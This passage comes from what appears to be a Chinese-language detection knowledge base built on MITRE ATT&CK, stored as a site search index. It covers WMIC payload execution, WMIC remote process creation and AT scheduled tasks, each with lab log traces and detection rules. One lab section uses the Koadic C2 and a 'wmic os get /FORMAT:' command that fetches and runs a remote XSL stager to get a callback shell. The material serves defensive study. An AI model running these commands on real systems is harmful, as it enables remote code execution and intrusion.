Instrumentation\uff09\u662fWindows\u7ba1\u7406\u529f\u80fd\uff0c\u5b83\u4e3a\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95eewindows\u7cfb\u7edf\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u73af\u5883\u3002\u5b83\u4f9d\u8d56WMI\u670d\u52a1\u6765\u8fdb\u884c\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u4ee5\u53caSMB\uff08\u670d\u52a1\u5668\u6d88\u606f\u5757\uff09\u548cRPCS\uff08\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u670d\u52a1\uff09\u6765\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u3002RPCS\u901a\u8fc7\u7aef\u53e3135\u8fd0\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528WMI\u4e0e\u672c\u5730\u548c\u8fdc\u7a0b\u7cfb\u7edf\u4ea4\u4e92\uff0c\u4e5f\u53ef\u80fd\u4f7f\u7528WMI\u6765\u5c06\u6267\u884c\u8bb8\u591a\u7b56\u7565\u529f\u80fd\uff0c\u4f8b\u5982\u4e3a\u53d1\u73b0\u6536\u96c6\u4fe1\u606f\u548c\u8fdc\u7a0b\u6267\u884c\u6587\u4ef6\u6765\u6a2a\u5411\u79fb\u52a8\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>WMIC\u6269\u5c55WMI\uff08Windows Management Instrumentation\uff0cWindows\u7ba1\u7406\u5de5\u5177\uff09\uff0c\u63d0\u4f9b\u4e86\u4ece\u547d\u4ee4\u884c\u63a5\u53e3\u548c\u6279\u547d\u4ee4\u811a\u672c\u6267\u884c\u7cfb\u7edf\u7ba1\u7406\u7684\u652f\u6301\u3002\u5728WMIC\u51fa\u73b0\u4e4b\u524d\uff0c\u5982\u679c\u8981\u7ba1\u7406WMI\u7cfb\u7edf\uff0c\u5fc5\u987b\u4f7f\u7528\u4e00\u4e9b\u4e13\u95e8\u7684WMI\u5e94\u7528\uff0c\u4f8b\u5982SMS\uff0c\u6216\u8005\u4f7f\u7528WMI\u7684\u811a\u672c\u7f16\u7a0bAPI\uff0c\u6216\u8005\u4f7f\u7528\u8c61CIM Studio\u4e4b\u7c7b\u7684\u5de5\u5177\u3002\u5982\u679c\u4e0d\u719f\u6089C++\u4e4b\u7c7b\u7684\u7f16\u7a0b\u8bed\u8a00\u6216VBScript\u4e4b\u7c7b\u7684\u811a\u672c\u8bed\u8a00\uff0c\u6216\u8005\u4e0d\u638c\u63e1WMI\u540d\u79f0\u7a7a\u95f4\u7684\u57fa\u672c\u77e5\u8bc6\uff0c\u8981\u7528WMI\u7ba1\u7406\u7cfb\u7edf\u662f\u5f88\u56f0\u96be\u7684\u3002WMIC\u6539\u53d8\u4e86\u8fd9\u79cd\u60c5\u51b5\u3002</p> <p>\u8bf4\u660e\uff1aWmic.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Wmic\u8c03\u7528\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\WINDOWS\\system32\\wbem\\wmic.exe\nC:\\WINDOWS\\SysWOW64\\wbem\\wmic.exe\n</code></pre> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\Windows\\System32\\wbem\\WMIC.exe\nC:\\Windows\\SysWOW64\\wbem\\WMIC.exe\n</code></pre> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#koadic","title":"Koadic","text":"<p>\u901a\u8fc7Koadic\u53d1\u8d77Wmic.exe\u653b\u51fb</p> <p>koadic\u662f\u4e00\u4e2a\u547d\u4ee4\u63a7\u5236\uff08C2\uff09\u5de5\u5177\uff0c\u7c7b\u4f3cMetasploit\u548cPowershell Empire\u3002\u4f7f\u7528koadic\u6211\u4eec\u751f\u6210\u6076\u610fXSL\u6587\u4ef6\u3002koadic\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u60a8\u53ef\u4ee5\u8fd0\u884c./koadic \u6587\u4ef6\u4ee5\u542f\u52a8 koadic\uff0c\u7136\u540e\u901a\u8fc7\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5f00\u59cb\u52a0\u8f7dstager/js/wmic \u7a0b\u5e8f\uff0c\u5e76\u5c06 SRVHOST \u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u56de\u8fdeIP\u3002</p> <pre><code>git clone https://github.com/zerosum0x0/koadic.git  #\u5b89\u88c5\u547d\u4ee4\ncd koadic\npip3 install -r requirements.txt\n</code></pre> <pre><code>#\u52a0\u8f7d\u8f7d\u8377\n./koadic\n(koadic: sta/js/mshta)# use stager/js/wmic\n(koadic: sta/js/wmic)# set SRVHOST 192.168.126.146\n[+] SRVHOST =&gt; 192.168.126.146\n(koadic: sta/js/wmic)# run\n[+] Spawned a stager at http://192.168.126.146:9996/6G69i.xsl\n[&gt;] wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<p>\u6267\u884c WMIC \u4ee5\u4e0b\u547d\u4ee4\uff0c\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0b\u8f7d\u548c\u8fd0\u884c\u6076\u610fXSL\u6587\u4ef6\uff1a</p> <pre><code>wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"\n</code></pre> <p>\u9776\u673a\u6d4b\u8bd5\u7ed3\u679c</p> <pre><code>C:\\Users\\12306Br0&gt;wmic os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"\n  os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"12306BR0-PCroot\\cimv2roo\nt\\cliIMPERSONATEPKTPRIVACYms_804ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\\Device\\Hardd\niskVolume17601Multiprocessor FreeMicrosoft Windows 7 \u65d7\u8230\u7248 93686Win32_Operating\nSystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256\n29608362009844309911620200305144428.000000+48020200305151330.500000+480202004171\n72815.995000+4800804Microsoft Corporation-18589934464zh-CNMicrosoft Windows 7 \u65d7\n\u8230\u7248 |C:\\Windows|\\Device\\Harddisk0\\Partition2422164-bit205225618TRUE112306Br0004\n26-292-0000007-85792102343416OK272\\Device\\HarddiskVolume2C:\\Windows\\system32C:44\n4004820966326.1.7601C:\\Windows\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<p>\u4e00\u65e6\u6076\u610f\u7684XSL\u6587\u4ef6\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\uff0c\u4f60\u5c06\u6709\u4e00\u4e2a\u50f5\u5c38\u8fde\u63a5\uff0c\u5c31\u50cfMetasploit\u56de\u8fde\u7684\u60c5\u51b5\u4e00\u6837\u3002</p> <pre><code>[+] Zombie 0: Staging new connection (192.168.126.149) on Stager 0\n[+] Zombie 0: 12306Br0-PC\\12306Br0 @ 12306BR0-PC -- Windows 7 Ultimate\n[!] Zombie 0: Timed out.\n[+] Zombie 0: Re-connected.\n(koadic: sta/js/wmic)# zombies 0\n\nID:                     0\nStatus:                 Alive\n        First Seen:             2020-04-17 17:28:31\n        Last Seen:              2020-04-17 17:29:04\n        Listener:               0\n\nIP:                     192.168.126.149\n        User:                   12306Br0-PC\\12306Br0\n        Hostname:               12306BR0-PC\n        Primary DC:             Unknown\n        OS:                     Windows 7 Ultimate\n        OSBuild:                7601\nOSArch:                 64\nElevated:               No\n\n        User Agent:             Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)\nSession Key:            02149f1202e3437ab7932672c0c9e6b5\n\n        JOB  NAME                            STATUS    ERRNO\n        ---- ---------                       -------   -------\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>#sysmon\u65e5\u5fd7\nEventID: 1\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: WMI Commandline Utility\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wmic.exe\nCommandLine: wmic  os get /FORMAT:\"http://192.168.126.146:9996/6G69i.xsl\"\n\n#win7\u5b89\u5168\u65e5\u5fd7\nEventID\uff1a4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID: 0x888\n\u65b0\u8fdb\u7a0b\u540d: 'C:\\Windows\\System32\\wbem\\WMIC.exe'\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1047:https://attack.mitre.org/techniques/T1047/</p> <p>windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09:http://www.safe6.cn/article/155</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/","title":"T1047-win-\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows\u7ba1\u7406\u89c4\u8303\uff08WMI\uff09\u662fWindows\u7ba1\u7406\u529f\u80fd\uff0c\u5b83\u4e3a\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95eeWindows\u7cfb\u7edf\u7ec4\u4ef6\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u73af\u5883\u3002\u5b83\u4f9d\u9760WMI\u670d\u52a1\u8fdb\u884c\u672c\u5730\u548c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u5e76\u4f9d\u9760\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u548c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u670d\u52a1\uff08RPCS\uff09\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u3002RPCS\u901a\u8fc7\u7aef\u53e3135\u8fd0\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528WMI\u4e0e\u672c\u5730\u548c\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff0c\u5e76\u5c06\u5176\u7528\u4f5c\u6267\u884c\u8bb8\u591a\u6218\u672f\u529f\u80fd\u7684\u624b\u6bb5\uff0c\u4f8b\u5982\u6536\u96c6\u4fe1\u606f\u4ee5\u8fdb\u884c\u53d1\u73b0\u548c\u8fdc\u7a0b\u6267\u884c\u6587\u4ef6\uff08\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\uff09\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528Windows Management Instrumentation\uff08WMI\uff09\u901a\u8fc7\u8fdc\u7a0b\u542f\u52a8\u53ef\u6267\u884c\u6587\u4ef6\u6765\u6a2a\u5411\u79fb\u52a8\u3002\u672c\u6848\u4f8b\u63cf\u8ff0\u4e86\u5982\u4f55\u4f7f\u7528\u7f51\u7edc\u6d41\u91cf\u76d1\u89c6\u548c\u76ee\u6807\u4e3b\u673a\u4e0a\u7684\u8fdb\u7a0b\u76d1\u89c6\u6765\u68c0\u6d4b\u8fd9\u4e9b\u8fdb\u7a0b\u3002\u4f46\u662f\uff0c\u5982\u679c\u5728\u6e90\u4e3b\u673a\u4e0a\u4f7f\u7528\u4e86\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fwmic.exe\uff0c\u5219\u53ef\u4ee5\u5728\u5206\u6790\u4e2d\u53e6\u5916\u68c0\u6d4b\u5230\u5b83\u3002\u6e90\u4e3b\u673a\u4e0a\u7684\u547d\u4ee4\u884c\u88ab\u6784\u5efa\u4e3a\u7c7b\u4f3cwmic.exe /node:\"\\&lt;hostname&gt;\" process call create \"\\&lt;command line&gt;\"\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7IP\u5730\u5740\u8fdb\u884c\u8fde\u63a5\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b57\u7b26\u4e32\"\\&lt;hostname&gt;\"\u4fee\u6539\u4e3aIP\u5730\u5740\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6e90\u4e3b\u673a\u6267\u884c\uff1awmic.exe /node:\"\\&lt;hostname&gt;\" process</p> <p></p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u4e8b\u4ef6ID\uff0c\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u8fdb\u7a0b\u540d\u79f0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<pre><code>title: \u901a\u8fc7wmic\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b\ndescription: windows server 2016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: system\ndetection:\n\u200b    selection:\n\u200b        EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa\n\u200b        Newprocessname: 'C:\\Windows\\System32\\wbem\\WMIC.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: 'wmic.exe /node:* process *' #\u8fdb\u7a0b\u547d\u4ee4\u884c\n\u200b    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1047-win-%E9%80%9A%E8%BF%87WMIC%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1047</p> <p>https://attack.mitre.org/techniques/T1047/</p> <p>CAR-2016-03-002\u901a\u8fc7WMIC\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b</p> <p>https://car.mitre.org/analytics/CAR-2016-03-002/</p> <p>wmic\u547d\u4ee4\u6536\u96c6\u4e0e\u6574\u7406</p> <p>https://blog.csdn.net/qq_20307987/article/details/7322203</p> <p>wmic\u5185\u7f51\u4f7f\u7528</p> <p>https://www.cnblogs.com/0xdd/p/11393392.html</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/","title":"T1053-002-win-\u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task Scheduler\u4e00\u8d77\u4f7f\u7528\u6765\u8c03\u5ea6\u7a0b\u5e8f\u6216\u811a\u672c\u5728\u67d0\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u3002\u53ea\u8981\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u53ef\u4ee5\u4f7f\u7528RPC\uff0c\u5e76\u4e14\u6253\u5f00\u4e86\u6587\u4ef6\u548c\u6253\u5370\u673a\u5171\u4eab\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u3002\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u8c03\u5ea6\u4efb\u52a1\u901a\u5e38\u9700\u8981\u8fdc\u7a0b\u7cfb\u7edf\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\u6210\u5458\u6267\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u4efb\u52a1\u8c03\u5ea6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6216\u5728\u8ba1\u5212\u7684\u57fa\u7840\u4e0a\u6267\u884c\u7a0b\u5e8f\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u4f5c\u4e3a\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u8fdc\u7a0b\u6267\u884c\uff0c\u83b7\u5f97\u7cfb\u7edf\u6743\u9650\uff0c\u6216\u8005\u5728\u6307\u5b9a\u8d26\u53f7\u7684\u4e0a\u4e0b\u6587\u4e0b\u8fd0\u884c\u8fdb\u7a0b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>AT\u547d\u4ee4\u867d\u7136\u81eaWin8\u7cfb\u7edf\u8d77\u5df2\u7ecf\u5f03\u7528\uff0c\u9700\u8981\u4f7f\u7528SCHTASKS\u547d\u4ee4\u4e86\uff0c\u4f46\u76ee\u524d\u6765\u770bwin7\u7684\u4f7f\u7528\u8303\u56f4\u8fd8\u662f\u5f88\u5e7f\u6cdb\u7684\u3002</p> <p>at time /interactive command ---\u7ed9\u7528\u6237\u4e00\u4e2a\u4e0e\u7a0b\u5e8f\u6216\u547d\u4ee4\u53c2\u4e0e\u4ea4\u4e92\u7684\u673a\u4f1a</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6210\u529f\u6267\u884c\u540e\uff0ccmd.exe\u5c06\u751f\u6210at.exe\u5e76\u521b\u5efa\u8ba1\u5212\u4efb\u52a1\uff0c\u8be5\u4efb\u52a1\u5c06\u5728\u7279\u5b9a\u65f6\u95f4\u751f\u6210cmd\u3002</p> <pre><code>at 17:28 /interactive cmd\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code># sysmon_log\uff0c\u4e8b\u4ef6ID\uff1a1\nProcess Create:\nRuleName: -\nUtcTime: 2020-11-29 09:16:59.072\nProcessGuid: {bb1f7c32-670b-5fc3-8000-000000001800}\nProcessId: 2548\nImage: C:\\Windows\\System32\\at.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Schedule service command line interface\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: AT.EXE\nCommandLine: at  17:28 /interactive cmd\nCurrentDirectory: C:\\Users\\12306Br0\\Desktop\\Sysmon\\\nUser: 12306Br0-PC\\12306Br0\nLogonGuid: {bb1f7c32-6401-5fc3-e5b7-1a0000000000}\nLogonId: 0x1ab7e5\nTerminalSessionId: 1\nIntegrityLevel: High\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<pre><code>title: \u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1\ndescription: \u4ea4\u4e92\u5f0fAT\u8ba1\u5212\u4efb\u52a1\uff0c\u53ef\u80fd\u662f\u63d0\u6743\u884c\u4e3a\nauthor: 12306Br0\ndate: 2020/11/29\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1053.002/T1053.002.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\ntags:\n    - attack.persistence\n    - attack.lateral_movement\n    - attack.t1053-002\nlogsource:\n    product: windows\n    service: sysmon #\u81ea\u884c\u914d\u7f6e\ndetection:\n    selection:\n        EventID: 1 #\u8fdb\u7a0b\u521b\u5efa\n        Image: 'at.exe'\n        CommandLine: '* interactive *'\n    condition: selection\nlevel: low\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_6","title":"\u5efa\u8bae","text":"<p>\u9664\u4e86\u57fa\u4e8esysmon\u65e5\u5fd7\u4e4b\u5916\uff0c\u9ad8\u7248\u672c\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u5b89\u5168\u65e5\u5fd7\u4e2d4688\u8fdb\u884c\u68c0\u6d4b</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E4%BA%A4%E4%BA%92%E5%BC%8Fat%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1053-002</p> <p>https://attack.mitre.org/techniques/T1053/002/</p> <p>CMD\u547d\u4ee4\u884c\u8ba1\u5212\u4efb\u52a1\u8bbe\u7f6e-AT</p> <p>https://baijiahao.baidu.com/s?id=1593905611581087845&amp;wfr=spider&amp;for=pc</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/","title":"T1053-002-win-\u901a\u8fc7GPO\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u6301\u4e45\u6027\u548c\u6267\u884c","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1053-002-win-%E9%80%9A%E8%BF%87GPO%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%89%A7%E8%A1%8C/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u8bf8\u5982at\u548cschtasks\u4e4b\u7c7b\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4e0eWindows Task 